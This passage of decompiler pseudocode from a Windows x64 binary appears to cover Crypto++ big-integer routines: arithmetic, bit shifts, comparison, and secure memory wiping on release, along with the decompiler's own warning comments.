// 13F112F94: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185448: using guessed type __int64 (__fastcall *off_13F185448[28])();
// 13F112F30: using guessed type __m128i var_90[2];

//----- (000000013F1130A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1130A0(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = off_13F185260;
  return a1;
}
// 13F185260: using guessed type __int64 (__fastcall *off_13F185260[3])();

//----- (000000013F1130D0) ----------------------------------------------------
__int64 __fastcall sub_13F1130D0(__int64 a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __m128i v5; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+40h] [rbp-28h]

  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v5.m128i_i8[0] = 0;
  sub_13F106C30(&v5, (const __m128i *)"Integer: no integer satisfies the given parameters");
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 6;
  sub_13F1053F0((__m128i **)(a1 + 32), &v5);
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v2 = si128.m128i_i64[1] + 1;
    v3 = v5.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v2 = si128.m128i_i64[1] + 40;
      v3 = *(_QWORD *)(v5.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v5.m128i_i64[0] - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v2);
  }
  *(_QWORD *)a1 = off_13F185260;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F185260: using guessed type __int64 (__fastcall *off_13F185260[3])();
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F1131B0) ----------------------------------------------------
__int64 __fastcall sub_13F1131B0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rdx
  unsigned __int64 v7; // rcx
  void *v8; // rdx
  char v10[8]; // [rsp+20h] [rbp-78h] BYREF
  __int64 v11; // [rsp+28h] [rbp-70h]
  __int64 v12; // [rsp+30h] [rbp-68h]
  __m128i si128; // [rsp+40h] [rbp-58h]
  void *v14; // [rsp+50h] [rbp-48h]
  __int64 v15; // [rsp+58h] [rbp-40h]
  void **v16; // [rsp+60h] [rbp-38h] BYREF
  void (__fastcall ***v17)(_QWORD, __int64); // [rsp+68h] [rbp-30h]

  v15 = -2i64;
  sub_13F10EE30(a1, 0);
  *(_DWORD *)(a1 + 24) = -1;
  *(_BYTE *)(a1 + 32) = 0;
  *(_QWORD *)a1 = off_13F185528;
  *(_QWORD *)(a1 + 8) = off_13F1856A0;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCB0);
  v14 = 0i64;
  v11 = a2;
  v12 = a3;
  v10[0] = 0;
  v6 = sub_13F107650((__int64)&v16, (__int64)"InputBuffer", (__int64)v10, 1u);
  sub_13F12A860((_QWORD *)a1, v6);
  if ( v17 )
    (**v17)(v17, 1i64);
  v16 = &CryptoPP::NameValuePairs::`vftable';
  v7 = si128.m128i_u64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v7 = si128.m128i_i64[0];
  v8 = v14;
  if ( v14 )
  {
    memset(v14, 0, v7);
    sub_13F12E550(v8);
  }
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F185528: using guessed type __int64 (__fastcall *off_13F185528[47])();
// 13F1856A0: using guessed type void *off_13F1856A0[3];
// 13F19CCB0: using guessed type __int128 xmmword_13F19CCB0;
// 13F1131B0: using guessed type char var_78[8];

//----- (000000013F1132A0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1132A0(_QWORD *a1)
{
  __int64 v1; // rdx
  unsigned __int64 result; // rax
  __int64 v3; // r8
  void *v4; // rdx

  v1 = 6i64;
  result = a1[6];
  if ( a1[5] < result )
    v1 = 5i64;
  v3 = a1[v1];
  v4 = (void *)a1[7];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    return sub_13F12E4D0((__int64)v4);
  }
  return result;
}

//----- (000000013F1132F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1132F0(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  unsigned __int64 result; // rax
  void *v7; // rdx

  v2 = 12i64;
  if ( a1[11] < a1[12] )
    v2 = 11i64;
  v3 = a1[v2];
  v4 = (void *)a1[13];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 6i64;
  result = a1[6];
  if ( a1[5] < result )
    v5 = 5i64;
  v7 = (void *)a1[7];
  if ( v7 )
  {
    memset(v7, 0, 8i64 * a1[v5]);
    return sub_13F12E4D0((__int64)v7);
  }
  return result;
}

//----- (000000013F113380) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F113380(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  void *v6; // rdx
  __int64 v7; // rcx
  unsigned __int64 result; // rax
  void *v9; // rdx

  *a1 = off_13F185368;
  v2 = 18i64;
  if ( a1[17] < a1[18] )
    v2 = 17i64;
  v3 = a1[v2];
  v4 = (void *)a1[19];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 12i64;
  if ( a1[11] < a1[12] )
    v5 = 11i64;
  v6 = (void *)a1[13];
  if ( v6 )
  {
    memset(v6, 0, 8i64 * a1[v5]);
    sub_13F12E4D0((__int64)v6);
  }
  v7 = 6i64;
  result = a1[6];
  if ( a1[5] < result )
    v7 = 5i64;
  v9 = (void *)a1[7];
  if ( v9 )
  {
    memset(v9, 0, 8i64 * a1[v7]);
    return sub_13F12E4D0((__int64)v9);
  }
  return result;
}
// 13F185368: using guessed type __int64 (__fastcall *off_13F185368[28])();

//----- (000000013F113450) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F113450(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  void *v6; // rdx

  *a1 = off_13F185448;
  v2 = 29i64;
  if ( a1[28] < a1[29] )
    v2 = 28i64;
  v3 = a1[v2];
  v4 = (void *)a1[30];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 24i64;
  if ( a1[23] < a1[24] )
    v5 = 23i64;
  v6 = (void *)a1[25];
  if ( v6 )
  {
    memset(v6, 0, 8i64 * a1[v5]);
    sub_13F12E4D0((__int64)v6);
  }
  return sub_13F113380(a1);
}
// 13F185448: using guessed type __int64 (__fastcall *off_13F185448[28])();

//----- (000000013F113500) ----------------------------------------------------
__int64 __fastcall sub_13F113500(__int64 a1, __int64 a2)
{
  __int64 v4; // rdx
  unsigned __int64 v5; // r8
  const __m128i *v6; // rcx
  __int64 *v7; // rax
  __int64 v8; // rax

  if ( a1 != a2 )
  {
    v4 = *(_QWORD *)(a1 + 24);
    v5 = *(_QWORD *)(a2 + 24);
    v6 = *(const __m128i **)(a2 + 32);
    if ( v4 != v5 || !v6->m128i_i64[v5 >> 1] )
    {
      if ( v5 )
      {
        v7 = &v6->m128i_i64[v5 - 1];
        do
        {
          if ( *v7 )
            break;
          --v7;
          --v5;
        }
        while ( v5 );
      }
      v8 = sub_13F122180((unsigned int)v5);
      sub_13F120E60((_QWORD *)(a1 + 8), v8);
      v4 = *(_QWORD *)(a1 + 24);
      v6 = *(const __m128i **)(a2 + 32);
    }
    if ( *(const __m128i **)(a1 + 32) != v6 )
      sub_13F10D330(*(__m128i **)(a1 + 32), 8 * v4, v6, 8 * v4);
    *(_DWORD *)(a1 + 40) = *(_DWORD *)(a2 + 40);
  }
  return a1;
}

//----- (000000013F1135A0) ----------------------------------------------------
__int64 __fastcall sub_13F1135A0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v5; // rax
  __int64 v6; // rax
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  char v10[16]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v11; // [rsp+40h] [rbp-28h]
  unsigned __int64 v12; // [rsp+48h] [rbp-20h]
  void *v13; // [rsp+50h] [rbp-18h]

  v5 = sub_13F112A00((__int64)v10, a1);
  v6 = sub_13F114080(v5, a3);
  sub_13F112A00(a2, v6);
  v7 = v12;
  if ( v11 < v12 )
    v7 = v11;
  v8 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  return a2;
}
// 13F1135A0: using guessed type char var_38[16];

//----- (000000013F113630) ----------------------------------------------------
bool __fastcall sub_13F113630(__int64 a1)
{
  _QWORD *v1; // rdx
  __int64 v2; // rax
  _QWORD *v3; // rcx

  if ( *(_DWORD *)(a1 + 40) == 1 )
    return 0;
  v1 = *(_QWORD **)(a1 + 32);
  if ( *v1 )
    return 0;
  v2 = *(_QWORD *)(a1 + 24);
  if ( v2 )
  {
    v3 = &v1[v2 - 1];
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v2;
    }
    while ( v2 );
  }
  return !(_DWORD)v2;
}

//----- (000000013F113670) ----------------------------------------------------
__int64 __fastcall sub_13F113670(__int64 a1)
{
  unsigned __int64 v2; // r8
  unsigned __int64 *v3; // r9
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rax
  unsigned int v6; // ecx
  __int64 v7; // rax
  unsigned __int64 v10; // rcx
  unsigned __int64 v11; // rax
  unsigned int v12; // ebx
  __int64 v13; // rdx
  unsigned __int64 v14; // rcx
  __int64 v15; // rax
  _QWORD *v16; // rcx

  v2 = *(_QWORD *)(a1 + 24);
  v3 = *(unsigned __int64 **)(a1 + 32);
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    v10 = *v3;
    v11 = *v3 - 1;
    *v3 = v11;
    if ( v11 > v10 )
    {
      v12 = 1;
      if ( v2 > 1 )
      {
        v13 = 1i64;
        do
        {
          v14 = v3[v13];
          v3[v13] = v14 - 1;
          if ( v14 )
            break;
          v13 = ++v12;
        }
        while ( v12 < v2 );
      }
    }
    v15 = *(_QWORD *)(a1 + 24);
    if ( v15 )
    {
      v16 = (_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * v15 - 8);
      do
      {
        if ( *v16 )
          break;
        --v16;
        --v15;
      }
      while ( v15 );
    }
    if ( !(_DWORD)v15 )
      sub_13F113500(a1, (__int64)&off_13F1C4398);
  }
  else
  {
    v4 = *v3;
    v5 = *v3 + 1;
    *v3 = v5;
    if ( v5 < v4 )
    {
      v6 = 1;
      if ( v2 <= 1 )
      {
LABEL_7:
        sub_13F11C2E0((_QWORD *)(a1 + 8), 2i64 * *(_QWORD *)(a1 + 24));
        *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64 * (*(_QWORD *)(a1 + 24) >> 1)) = 1i64;
        return a1;
      }
      v7 = 1i64;
      while ( v3[v7]++ == -1i64 )
      {
        v7 = ++v6;
        if ( v6 >= v2 )
          goto LABEL_7;
      }
    }
  }
  return a1;
}
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();

//----- (000000013F113780) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F113780(__int64 a1)
{
  unsigned __int64 v2; // r8
  unsigned __int64 *v3; // rdi
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rax
  unsigned int v6; // ecx
  __int64 v7; // rax
  unsigned __int64 v9; // r9
  unsigned __int64 *v10; // r8
  unsigned __int64 v11; // rcx
  unsigned __int64 v12; // rax
  unsigned int v13; // edx
  __int64 v14; // rdi
  unsigned __int64 v15; // rcx
  __int64 v16; // rcx
  __int64 v17; // rdx
  unsigned __int64 v18; // rbp
  __m128i *v19; // rax
  __int64 *v20; // r14
  unsigned __int64 v21; // rax
  __int64 *v22; // rcx
  __int64 (__fastcall **v24)(); // [rsp+28h] [rbp-50h] BYREF
  char v25[8]; // [rsp+30h] [rbp-48h] BYREF
  __int64 v26; // [rsp+38h] [rbp-40h]
  unsigned __int64 v27; // [rsp+40h] [rbp-38h]
  __m128i *v28; // [rsp+48h] [rbp-30h]
  int v29; // [rsp+50h] [rbp-28h]

  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    v2 = *(_QWORD *)(a1 + 24);
    v3 = *(unsigned __int64 **)(a1 + 32);
    v4 = *v3;
    v5 = *v3 + 1;
    *v3 = v5;
    if ( v5 < v4 )
    {
      v6 = 1;
      if ( v2 <= 1 )
      {
LABEL_7:
        sub_13F11C2E0((_QWORD *)(a1 + 8), 2i64 * *(_QWORD *)(a1 + 24));
        *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64 * (*(_QWORD *)(a1 + 24) >> 1)) = 1i64;
      }
      else
      {
        v7 = 1i64;
        while ( v3[v7]++ == -1i64 )
        {
          v7 = ++v6;
          if ( v6 >= v2 )
            goto LABEL_7;
        }
      }
    }
  }
  else
  {
    v9 = *(_QWORD *)(a1 + 24);
    v10 = *(unsigned __int64 **)(a1 + 32);
    v11 = *v10;
    v12 = *v10 - 1;
    *v10 = v12;
    if ( v12 > v11 )
    {
      v13 = 1;
      if ( v9 <= 1 )
      {
LABEL_13:
        v24 = off_13F185278;
        v16 = 2i64;
        v17 = 3942920i64;
        do
        {
          if ( *(_QWORD *)v17 )
            break;
          v17 -= 8i64;
          --v16;
        }
        while ( v16 );
        v18 = sub_13F122180((unsigned int)v16);
        v26 = 0x1FFFFFFFFFFFFFFFi64;
        v27 = v18;
        v19 = (__m128i *)sub_13F123740((__int64)v25, v18);
        v20 = (__int64 *)v19;
        v28 = v19;
        v29 = 0;
        if ( v19 != (__m128i *)3942912 )
          sub_13F10D330(v19, 8 * v18, (const __m128i *)0x3C2A00, 8 * v18);
        if ( *v20 )
          goto LABEL_24;
        v21 = v18;
        if ( v18 )
        {
          v22 = &v20[v18 - 1];
          do
          {
            if ( *v22 )
              break;
            --v22;
            --v21;
          }
          while ( v21 );
        }
        if ( (_DWORD)v21 )
LABEL_24:
          v29 = 1;
        sub_13F113500(a1, (__int64)&v24);
        if ( v18 > 0x1FFFFFFFFFFFFFFFi64 )
          v18 = 0x1FFFFFFFFFFFFFFFi64;
        if ( v20 )
        {
          memset(v20, 0, 8 * v18);
          sub_13F12E4D0((__int64)v20);
        }
      }
      else
      {
        v14 = 1i64;
        while ( 1 )
        {
          v15 = v10[v14];
          v10[v14] = v15 - 1;
          if ( v15 )
            break;
          v14 = ++v13;
          if ( v13 >= v9 )
            goto LABEL_13;
        }
      }
    }
  }
  return a1;
}
// 13F11386C: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F1C43D8: using guessed type __int128 xmmword_13F1C43D8;
// 13F1C43E8: using guessed type __int64 qword_13F1C43E8;
// 13F1C43F0: using guessed type int dword_13F1C43F0;
// 13F113780: using guessed type char var_48[8];

//----- (000000013F113990) ----------------------------------------------------
__int64 __fastcall sub_13F113990(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v6; // r8
  __int64 v7; // r8
  __int64 v8; // rdx

  v6 = *(_QWORD *)(a2 + 24);
  if ( v6 < *(_QWORD *)(a3 + 24) )
    v6 = *(_QWORD *)(a3 + 24);
  sub_13F112960(a1, 0i64, v6);
  if ( *(_DWORD *)(a2 + 40) == 1 )
  {
    if ( *(_DWORD *)(a3 + 40) != 1 )
    {
      sub_13F120FA0(a1, a2, a3);
      *(_DWORD *)(a1 + 40) = 1;
      return a1;
    }
    v7 = a2;
    v8 = a3;
LABEL_9:
    sub_13F1213E0(a1, v8, v7);
    return a1;
  }
  v7 = a3;
  v8 = a2;
  if ( *(_DWORD *)(a3 + 40) != 1 )
    goto LABEL_9;
  sub_13F120FA0(a1, a2, a3);
  return a1;
}

//----- (000000013F113A30) ----------------------------------------------------
_QWORD *__fastcall sub_13F113A30(_QWORD *a1, __int64 a2, __int32 a3)
{
  const __m128i *v5; // rdx
  __int64 v6; // rcx
  unsigned __int64 v7; // rdx
  __int64 v9; // [rsp+30h] [rbp-28h] BYREF
  const __m128i *v10; // [rsp+38h] [rbp-20h]
  const __m128i *v11; // [rsp+40h] [rbp-18h]
  __int32 v12; // [rsp+70h] [rbp+18h] BYREF

  sub_13F112700((unsigned __int64 *)&v9, a2 + 8);
  v12 = a3;
  v5 = v10;
  if ( v11 == v10 )
  {
    sub_13F10AE80(&v9, v10, &v12);
  }
  else
  {
    v10->m128i_i32[0] = a3;
    v10 = (const __m128i *)&v5->m128i_i8[4];
  }
  *a1 = off_13F181EC8;
  sub_13F112700(a1 + 1, (__int64)&v9);
  v6 = v9;
  if ( v9 )
  {
    v7 = ((unsigned __int64)v11 - v9) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v7 >= 0x1000 )
    {
      v7 += 39i64;
      v6 = *(_QWORD *)(v9 - 8);
      if ( (unsigned __int64)(v9 - v6 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v6, v7);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F113B00) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F113B00(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 (__fastcall **v10)(); // [rsp+30h] [rbp-48h] BYREF
  char v11[8]; // [rsp+38h] [rbp-40h] BYREF
  __m128i si128; // [rsp+40h] [rbp-38h]
  void *v13; // [rsp+50h] [rbp-28h]
  int v14; // [rsp+58h] [rbp-20h]

  v10 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v6 = (_QWORD *)sub_13F123740((__int64)v11, 2ui64);
  v13 = v6;
  v14 = 0;
  v6[1] = 0i64;
  *v6 = 0i64;
  *(_QWORD *)a1 = off_13F185278;
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 24) = 2i64;
  *(_QWORD *)(a1 + 32) = sub_13F123740(a1 + 8, 2ui64);
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8i64) = 0i64;
  **(_QWORD **)(a1 + 32) = 0i64;
  sub_13F11CFD0((__int64)&v10, a1, a2, a3);
  v7 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v7 = si128.m128i_i64[0];
  v8 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  return a1;
}
// 13F113B3D: write access to const memory at 13F1C4384 has been detected
// 13F113B8E: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F113B00: using guessed type char var_40[8];

//----- (000000013F113C40) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F113C40(__int64 *a1, unsigned __int64 a2)
{
  unsigned int v2; // esi
  __int64 v3; // rax
  unsigned __int64 v4; // rdi
  unsigned int v5; // ebx
  _QWORD v7[3]; // [rsp+20h] [rbp-18h] BYREF

  v2 = a2;
  v3 = *a1;
  if ( !a2 )
    return a1[1];
  v7[1] = a1[1];
  v7[0] = v3;
  v4 = HIDWORD(a2);
  v5 = sub_13F112090((unsigned int *)v7 + 1, a2, HIDWORD(a2));
  return ((unsigned __int64)v5 << 32) | (unsigned int)sub_13F112090((unsigned int *)v7, v2, v4);
}

//----- (000000013F113CE0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F113CE0(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rax
  __int64 v5[3]; // [rsp+20h] [rbp-18h] BYREF

  v2 = a1[1];
  if ( a2 < 0x100000000i64 )
    return ((unsigned int)*a1 + (((HIDWORD(*a1) + ((v2 % (unsigned int)a2) << 32)) % (unsigned int)a2) << 32))
         % (unsigned int)a2;
  v5[0] = *a1;
  v5[1] = v2;
  sub_13F112090((unsigned int *)v5 + 1, a2, HIDWORD(a2));
  sub_13F112090((unsigned int *)v5, a2, HIDWORD(a2));
  return v5[0];
}
// 13F113D3A: conditional instruction was optimized away because rdx.8>=100000000u

//----- (000000013F113DA0) ----------------------------------------------------
bool __fastcall sub_13F113DA0(__int64 a1, __int64 a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(a2 + 40);
  if ( *(_DWORD *)(a1 + 40) == 1 )
    return v2 == 1 && (int)sub_13F121140(a1, a2) < 0;
  else
    return v2 == 1 || (int)sub_13F121140(a1, a2) > 0;
}

//----- (000000013F113E00) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F113E00(__int64 a1, __int64 a2)
{
  __m128i *v4; // rax
  __m128i *v5; // rbp
  unsigned __int64 v6; // rsi
  __int64 v7; // rdx
  __int64 v8; // rax
  __int64 *v9; // rcx
  __int64 v10; // rax
  __m128i *v11; // rcx
  __int64 (__fastcall **v13)(); // [rsp+28h] [rbp-40h] BYREF
  char v14[8]; // [rsp+30h] [rbp-38h] BYREF
  __m128i si128; // [rsp+38h] [rbp-30h]
  __m128i *v16; // [rsp+48h] [rbp-20h]
  int v17; // [rsp+50h] [rbp-18h]

  v13 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v4 = (__m128i *)sub_13F123740((__int64)v14, 2ui64);
  v16 = v4;
  v17 = 0;
  v4->m128i_i64[1] = 0i64;
  v4->m128i_i64[0] = 0i64;
  sub_13F120710((__int64)&v13, a1, a2);
  v5 = v16;
  v6 = si128.m128i_u64[1];
  if ( (__int64 (__fastcall ***)())a1 != &v13 )
  {
    v7 = *(_QWORD *)(a1 + 24);
    if ( v7 != si128.m128i_i64[1] || !v16->m128i_i64[(unsigned __int64)si128.m128i_i64[1] >> 1] )
    {
      v8 = si128.m128i_i64[1];
      if ( si128.m128i_i64[1] )
      {
        v9 = &v16[-1].m128i_i64[si128.m128i_i64[1] + 1];
        do
        {
          if ( *v9 )
            break;
          --v9;
          --v8;
        }
        while ( v8 );
      }
      v10 = sub_13F122180((unsigned int)v8);
      sub_13F120E60((_QWORD *)(a1 + 8), v10);
      v7 = *(_QWORD *)(a1 + 24);
    }
    v11 = *(__m128i **)(a1 + 32);
    if ( v11 != v5 )
      sub_13F10D330(v11, 8 * v7, v5, 8 * v7);
    *(_DWORD *)(a1 + 40) = v17;
  }
  if ( si128.m128i_i64[0] < v6 )
    v6 = si128.m128i_i64[0];
  if ( v5 )
  {
    memset(v5, 0, 8 * v6);
    sub_13F12E4D0((__int64)v5);
  }
  return a1;
}
// 13F113E35: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F113E00: using guessed type char var_38[8];

//----- (000000013F113F60) ----------------------------------------------------
__int64 __fastcall sub_13F113F60(__int64 a1, __int64 a2)
{
  int v4; // eax
  __int64 v5; // r8
  __int64 v6; // rdx
  __int64 result; // rax

  sub_13F11C2E0((_QWORD *)(a1 + 8), *(_QWORD *)(a2 + 24));
  v4 = *(_DWORD *)(a2 + 40);
  if ( *(_DWORD *)(a1 + 40) != 1 )
  {
    v5 = a2;
    v6 = a1;
    if ( v4 != 1 )
    {
      sub_13F120FA0(a1, a1, a2);
      return a1;
    }
    goto LABEL_6;
  }
  if ( v4 != 1 )
  {
    v5 = a1;
    v6 = a2;
LABEL_6:
    sub_13F1213E0(a1, v6, v5);
    return a1;
  }
  sub_13F120FA0(a1, a1, a2);
  result = a1;
  *(_DWORD *)(a1 + 40) = 1;
  return result;
}

//----- (000000013F113FF0) ----------------------------------------------------
__int64 __fastcall sub_13F113FF0(__int64 a1, __int64 a2)
{
  int v4; // eax
  __int64 v5; // r8
  __int64 v6; // rdx
  __int64 result; // rax

  sub_13F11C2E0((_QWORD *)(a1 + 8), *(_QWORD *)(a2 + 24));
  v4 = *(_DWORD *)(a2 + 40);
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    if ( v4 != 1 )
    {
      sub_13F120FA0(a1, a1, a2);
      result = a1;
      *(_DWORD *)(a1 + 40) = 1;
      return result;
    }
    v5 = a1;
    v6 = a2;
  }
  else
  {
    v5 = a2;
    v6 = a1;
    if ( v4 == 1 )
    {
      sub_13F120FA0(a1, a1, a2);
      return a1;
    }
  }
  sub_13F1213E0(a1, v6, v5);
  return a1;
}

//----- (000000013F114080) ----------------------------------------------------
__int64 __fastcall sub_13F114080(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v3; // r10
  _QWORD *v5; // rdi
  unsigned __int64 v6; // r8
  int v7; // er11
  unsigned __int64 v8; // rcx
  _QWORD *v9; // rdx
  unsigned __int64 v10; // rdi
  __int64 v11; // rax
  _QWORD *v12; // rcx

  v2 = *(_QWORD *)(a1 + 24);
  v3 = *(_QWORD **)(a1 + 32);
  if ( v2 )
  {
    v5 = &v3[v2 - 1];
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v2;
    }
    while ( v2 );
  }
  v6 = a2 >> 6;
  v7 = a2 & 0x3F;
  v8 = a2 >> 6;
  if ( (unsigned int)v2 < a2 >> 6 )
    v8 = (unsigned int)v2;
  if ( v8 )
  {
    if ( v8 < (unsigned int)v2 )
    {
      v9 = v3;
      v10 = v8;
      do
      {
        ++v10;
        *v9 = v9[v8];
        ++v9;
      }
      while ( v10 < (unsigned int)v2 );
    }
    memset(&v3[(unsigned int)v2 - v8], 0, 8 * v8);
  }
  if ( (unsigned int)v2 > v6 )
    sub_13F122390(*(_QWORD *)(a1 + 32), (unsigned int)v2 - v6, v7);
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    v11 = *(_QWORD *)(a1 + 24);
    if ( v11 )
    {
      v12 = (_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * v11 - 8);
      do
      {
        if ( *v12 )
          break;
        --v12;
        --v11;
      }
      while ( v11 );
    }
    if ( !(_DWORD)v11 )
      sub_13F113500(a1, (__int64)&off_13F1C4398);
  }
  return a1;
}
// 13F114100: conditional instruction was optimized away because rcx.8!=0
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();

//----- (000000013F114170) ----------------------------------------------------
__int64 __fastcall sub_13F114170(__int64 a1, unsigned __int64 a2)
{
  __int64 v3; // rcx
  __int64 v4; // rax
  _QWORD *v5; // r8
  __int64 v6; // rbp
  unsigned __int64 v7; // rbx
  char v8; // si
  __int64 v9; // rax
  unsigned __int64 v10; // r9
  __int64 v11; // rbx
  unsigned int v12; // esi
  unsigned __int64 v13; // r8
  unsigned __int64 v14; // r11
  __int64 v15; // rax
  unsigned __int64 v16; // r9

  v3 = *(_QWORD *)(a1 + 32);
  v4 = *(_QWORD *)(a1 + 24);
  if ( v4 )
  {
    v5 = (_QWORD *)(v3 - 8 + 8 * v4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = (unsigned int)v4;
  v7 = a2 >> 6;
  v8 = a2;
  v9 = sub_13F122180((unsigned int)v4 + ((a2 + 63) >> 6));
  sub_13F11C2E0((_QWORD *)(a1 + 8), v9);
  sub_13F122320(*(char **)(a1 + 32), v7 + v6, v7);
  v10 = 0i64;
  v11 = *(_QWORD *)(a1 + 32) + 8 * v7;
  v12 = v8 & 0x3F;
  if ( v12 )
  {
    v13 = 0i64;
    v14 = v6 + (((unsigned __int64)v12 + 63) >> 6);
    if ( v14 )
    {
      do
      {
        v15 = v10 | (*(_QWORD *)(v11 + 8 * v13) << v12);
        v16 = *(_QWORD *)(v11 + 8 * v13);
        *(_QWORD *)(v11 + 8 * v13++) = v15;
        v10 = v16 >> (64 - (unsigned __int8)v12);
      }
      while ( v13 < v14 );
    }
  }
  return a1;
}

//----- (000000013F114260) ----------------------------------------------------
_QWORD *__fastcall sub_13F114260(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  void *v5; // r8

  v4 = 7i64;
  if ( a1[6] < a1[7] )
    v4 = 6i64;
  v5 = (void *)a1[8];
  if ( v5 )
  {
    memset(v5, 0, 8i64 * a1[v4]);
    sub_13F12E4D0((__int64)v5);
  }
  sub_13F102CD0((__int64)a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 80i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1142E0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1142E0(_QWORD *a1, char a2)
{
  sub_13F1132F0(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 120i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F114320) ----------------------------------------------------
_QWORD *__fastcall sub_13F114320(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  void *v5; // r8

  v4 = 3i64;
